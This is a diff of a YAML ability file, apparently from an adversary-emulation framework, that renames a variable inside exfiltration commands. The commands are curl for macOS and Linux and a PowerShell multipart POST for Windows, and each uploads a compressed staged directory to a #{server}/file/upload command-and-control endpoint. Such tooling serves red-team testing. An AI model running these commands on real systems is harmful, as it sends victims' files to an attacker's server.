@@ -11,20 +11,20 @@
     darwin:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress.private}" --header “X-Request-ID: #{paw}” #{server}/file/upload
+          curl -F "data=@#{host.dir.compress}" --header “X-Request-ID: #{paw}” #{server}/file/upload
     linux:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress.private}" --header “X-Request-ID: #{paw}” #{server}/file/upload
+          curl -F "data=@#{host.dir.compress}" --header “X-Request-ID: #{paw}” #{server}/file/upload
     windows:
       psh,pwsh:
         command: |
-          $fileBin = [System.IO.File]::ReadAllBytes("#{host.dir.compress.private}");
+          $fileBin = [System.IO.File]::ReadAllBytes("#{host.dir.compress}");
           $enc = [System.Text.Encoding]::GetEncoding('UTF-8');
           $fileEnc = $enc.GetString($fileBin);
           $boundary = [System.Guid]::NewGuid().ToString();
           $LF = "`r`n";
-          $bodyLines = ("--$boundary", 'Content-Disposition: form-data; name="fileData"; filename="#{host.dir.compress.private}"', "Content-Type: application/octet-stream$LF", $fileEnc, "--$boundary--$LF") -join $LF;
+          $bodyLines = ("--$boundary", 'Content-Disposition: form-data; name="fileData"; filename="#{host.dir.compress}"', "Content-Type: application/octet-stream$LF", $fileEnc, "--$boundary--$LF") -join $LF;
           $url="#{server}/file/upload";
           $web=New-Object -ComObject MSXML2.ServerXMLHTTP;
           $web.setOption(2,13056);
